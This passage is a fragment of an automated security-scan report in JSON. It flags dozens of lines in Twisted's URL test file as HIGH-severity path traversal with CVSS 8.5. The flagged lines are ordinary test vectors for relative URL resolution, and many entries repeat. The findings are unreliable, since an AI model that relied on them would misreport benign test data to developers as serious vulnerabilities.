            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 42,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../g\", \"http://a/b/g\"),",
            "context": "    (\"..\", \"http://a/b/\"),\n    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../..\", \"http://a/\"),",
            "context": "    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../..\", \"http://a/\"),",
            "context": "    (\"../\", \"http://a/b/\"),\n    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 44,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../\", \"http://a/\"),",
            "context": "    (\"../g\", \"http://a/b/g\"),\n    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../g\", \"http://a/g\"),",
            "context": "    (\"../..\", \"http://a/\"),\n    (\"../../\", \"http://a/\"),\n    (\"../../g\", \"http://a/g\"),\n    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 48,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../g\", \"http://a/g\"),",
            "context": "    # Abnormal examples\n    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 49,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"../../../../g\", \"http://a/g\"),",
            "context": "    # \"..\" cannot be used to change the authority component of a URI.\n    (\"../../../g\", \"http://a/g\"),\n    (\"../../../../g\", \"http://a/g\"),\n    # Only include \".\" and \"..\" when they are only part of a larger segment,\n    # not by themselves.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/../g\", \"http://a/g\"),",
            "context": "    # not by themselves.\n    (\"/./g\", \"http://a/g\"),\n    (\"/../g\", \"http://a/g\"),\n    (\"g.\", \"http://a/b/c/g.\"),\n    (\".g\", \"http://a/b/c/.g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 53,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"/../g\", \"http://a/g\"),",
            "context": "    # not by themselves.\n    (\"/./g\", \"http://a/g\"),\n    (\"/../g\", \"http://a/g\"),\n    (\"g.\", \"http://a/b/c/g.\"),\n    (\".g\", \"http://a/b/c/.g\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 59,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"./../g\", \"http://a/b/g\"),",
            "context": "    (\"..g\", \"http://a/b/c/..g\"),\n    # Unnecessary or nonsensical forms of \".\" and \"..\".\n    (\"./../g\", \"http://a/b/g\"),\n    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 59,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"./../g\", \"http://a/b/g\"),",
            "context": "    (\"..g\", \"http://a/b/c/..g\"),\n    # Unnecessary or nonsensical forms of \".\" and \"..\".\n    (\"./../g\", \"http://a/b/g\"),\n    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g/../h\", \"http://a/b/c/h\"),",
            "context": "    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),\n    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g/../h\", \"http://a/b/c/h\"),",
            "context": "    (\"./g/.\", \"http://a/b/c/g/\"),\n    (\"g/./h\", \"http://a/b/c/g/h\"),\n    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "context": "    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),\n    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g;x=1/../y\", \"http://a/b/c/y\"),",
            "context": "    (\"g/../h\", \"http://a/b/c/h\"),\n    (\"g;x=1/./y\", \"http://a/b/c/g;x=1/y\"),\n    (\"g;x=1/../y\", \"http://a/b/c/y\"),\n    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g?y/../x\", \"http://a/b/c/g?y/../x\"),",
            "context": "    # Separating the reference's query and fragment components from the path.\n    (\"g?y/./x\", \"http://a/b/c/g?y/./x\"),\n    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n    # Not supported:  scheme with relative path\n    # (\"http:g\", \"http:g\"),              # strict",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n    # Not supported:  scheme with relative path\n    # (\"http:g\", \"http:g\"),              # strict",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n    # Not supported:  scheme with relative path\n    # (\"http:g\", \"http:g\"),              # strict",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 69,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "(\"g#s/../x\", \"http://a/b/c/g#s/../x\"),",
            "context": "    (\"g?y/../x\", \"http://a/b/c/g?y/../x\"),\n    (\"g#s/./x\", \"http://a/b/c/g#s/./x\"),\n    (\"g#s/../x\", \"http://a/b/c/g#s/../x\"),\n    # Not supported:  scheme with relative path\n    # (\"http:g\", \"http:g\"),              # strict",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 402,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"..\", \"http://localhost/a/\"],\n            [\"http://localhost/a/b/c\", \"./d/e\", \"http://localhost/a/b/d/e\"],\n            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 402,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"..\", \"http://localhost/a/\"],\n            [\"http://localhost/a/b/c\", \"./d/e\", \"http://localhost/a/b/d/e\"],\n            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 404,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 404,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 405,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/./d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 406,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 406,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],",
            "context": "            [\"http://localhost/a/b/c\", \"/../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 407,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 407,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],",
            "context": "            [\"http://localhost/a/b/c/\", \"../../d/e/\", \"http://localhost/a/d/e/\"],\n            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 408,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
